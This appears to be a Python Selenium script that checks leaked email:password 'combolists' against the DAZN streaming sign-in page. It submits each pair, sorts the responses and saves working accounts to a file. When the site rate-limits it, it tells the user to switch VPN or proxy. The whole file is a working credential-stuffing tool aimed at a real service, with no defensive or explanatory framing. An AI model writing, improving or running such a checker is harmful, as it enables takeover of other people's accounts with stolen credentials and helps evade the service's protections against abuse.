import time
import os
from services.chrome_version import GetChromeVersionForCurrentOS
from combo_splitters.split_combos import ComboSplitter
from titles.dazn_title import title
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException
from selenium.common.exceptions import InvalidSessionIdException
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path


def dazn():
    title()
    chrome_version = GetChromeVersionForCurrentOS()
    file_directory = str(Path(__file__).parents[1]) + '/combolists/dazn'
    page = 'https://www.dazn.com/signin'
    plain_directory = str(Path(__file__).parents[1])
    error_flag = False
    browser_options = Options()
    browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
                                 '(KHTML, like Gecko) Chrome/{} Safari/537.36'.format(chrome_version))
    browser_options.add_experimental_option('excludeSwitches',['enable-logging'])
    #browser_options.add_argument('--headless=new')
    splitter = ComboSplitter(file_directory, "dazn")
    try:
        users, passwords = splitter.split_file()
    except TypeError:
        splitter.return_error(plain_directory + "/combolists")
        exit()
    index = 0
    while index != len(users):
        os.makedirs('accounts', exist_ok=True)
        with open(plain_directory + '/accounts/dazn_working_accounts', 'a') as account_results:
            try:
                print('\rTrying Combo {} out of {}'.format(index + 1, len(users)), end='')
                browser = webdriver.Chrome(options=browser_options)
                browser.set_window_size(500, 700)
                browser.get(page)
                time.sleep(8)
#//*[@id="onetrust-reject-all-handler"]
                if browser.find_elements(By.XPATH, '//*[@id="onetrust-accept-btn-handler"]'):
                    gdpr_accept_all_button = browser.find_element(By.XPATH, '//*[@id="onetrust-accept-btn-handler"]')
                    gdpr_accept_all_button.click()
                    time.sleep(8)

                if browser.find_elements(By.XPATH, '//*[@id="root"]/div/div[2]/div/div[4]/div[1]'):
                    print('\nCountry not supported, or blacklisted VPN IP')
                    print('please use a supported location/IP address.\nEnding.\n')
                    exit()

                email_input_box = browser.find_element(By.XPATH, '//input[@id="email"]')
                password_input_box = browser.find_element(By.XPATH, '//input[@id="password"]')
                sign_in_button = browser.find_element(By.XPATH, '//button[@type="submit"]')
                email_input_box.send_keys(users[index])
                password_input_box.send_keys(passwords[index])
                sign_in_button.click()
                time.sleep(6)
                if browser.find_elements(By.XPATH, '/html/body/reach-portal/div[3]/div/div/div'):
                    four_two_nine = browser.find_element(By.XPATH, '/html/body/reach-portal/div[3]/div/div/div').text
                    if 'Too many attempts' in four_two_nine:
                        print(" | {}:{} ---> 429 - Too many attempts\nPlease change your VPN/Proxy and try again."
                              .format(users[index], passwords[index]))
                        print("Ending.")
                        exit()
                if browser.find_elements(By.XPATH, '//*[@id="root"]/div/div[2]/div/div[2]/div/section/header/h1'):
                    print(" | {}:{} ---> Expired Account".format(users[index], passwords[index]))
                    error_flag = True

                if browser.find_elements(By.XPATH, '//*[@id="password_error"]'):
                    print(" | {}:{} ---> Invalid Credentials".format(users[index], passwords[index]))
                    error_flag = True

                if browser.find_elements(By.XPATH, '//*[@id="root"]/div/div[2]/div/div/div/div[2]/div/span/div'):
                    expired_account_text = browser.find_element(By.XPATH,
                                                                '//*[@id="root"]/div/div[2]/div/div/div/div['
                                                                '2]/div/span/div').text
                    if 'Welcome back.' in expired_account_text:
                        print(' | {}:{} ---> Account Expired'.format(users[index], passwords[index]))

                    if 'Finish signing up' in expired_account_text:
                        print(' | {}:{} ---> No Payment Method'.format(users[index], passwords[index]))

                elif not error_flag:
                    print(' | {}:{} ---> Success!'.format(users[index], passwords[index]))
                    account_results.write('{}:{} ---> Good Account\n'.format(users[index], passwords[index]))

                index += 1
                error_flag = False
                browser.close()
            except ElementClickInterceptedException:
                print(' | Click Intercepted, iteration index was not incremented.')

            except NoSuchElementException:
                print(' | Element hidden, iteration index was not incremented.')

            except InvalidSessionIdException:
                print('Session terminated unexpectedly.\n')
                break
